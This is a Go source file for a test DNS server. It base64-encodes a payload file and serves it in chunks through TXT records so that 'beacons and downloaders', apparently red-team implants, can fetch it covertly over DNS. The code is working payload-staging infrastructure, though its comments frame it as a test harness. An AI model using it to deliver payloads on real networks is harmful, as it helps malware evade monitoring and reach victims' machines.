// Implement a basic DNS server for testing beacons and downloaders. This should
// not be used in production.
package main

import (
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"log"
	"strconv"
	"strings"

	"github.com/miekg/dns"
)

const payloadFile = "payload.bin"

var chunks map[string]string

// Base64 encode our payload and break it into 240 character chunks to be sent
// over TXT lookups. Store the chunks in a map with the chunk count as the index.
//
// This excellent idea is courtesy of @breenmachine https://github.com/breenmachine/dnsftp
func chunk(data []byte) {
	str := base64.StdEncoding.EncodeToString(data)
	size := 240
	count := (len(str) / size) + 1

	for i := 0; i < count; i++ {
		iStr := strconv.Itoa(i)
		begin := i * size
		end := begin + size

		if end > len(str) {
			end = len(str)
		}

		chunks[iStr] = str[begin:end]
	}
}

// Define a DNS server handler.
type handler struct{}

// ServeDNS will respond to the NS and TXT requests necessary for testing the
// DNS beacon and downloader.
func (this *handler) ServeDNS(w dns.ResponseWriter, r *dns.Msg) {
	msg := dns.Msg{}
	msg.SetReply(r)

	switch r.Question[0].Qtype {
	case dns.TypeNS:
		log.Printf("NS request for %s\n", r.Question[0].Name)

		rr, err := dns.NewRR(fmt.Sprintf("uuid.domain.com NS ns.domain.com"))
		if err != nil {
			return
		}

		msg.Answer = append(msg.Answer, rr)

	case dns.TypeTXT:
		log.Printf("TXT request for %s\n", r.Question[0].Name)

		key := strings.Split(r.Question[0].Name, ".")[0]
		val, ok := chunks[key]
		if !ok {
			val = ""
		}

		rr, err := dns.NewRR(fmt.Sprintf("%s.domain.com TXT %s", key, val))
		if err == nil {
			msg.Answer = append(msg.Answer, rr)
		}
	}

	w.WriteMsg(&msg)
}

func main() {
	chunks = make(map[string]string)

	// Open our payload file and chunk it.
	data, err := ioutil.ReadFile(payloadFile)
	if err != nil {
		log.Print("Failed to read file.")
	} else {
		chunk(data)
	}

	// Start our DNS server.
	srv := &dns.Server{Addr: ":" + strconv.Itoa(53), Net: "udp"}
	srv.Handler = &handler{}
	if err := srv.ListenAndServe(); err != nil {
		log.Fatalf("Failed to set udp listener %s\n", err.Error())
	}
}
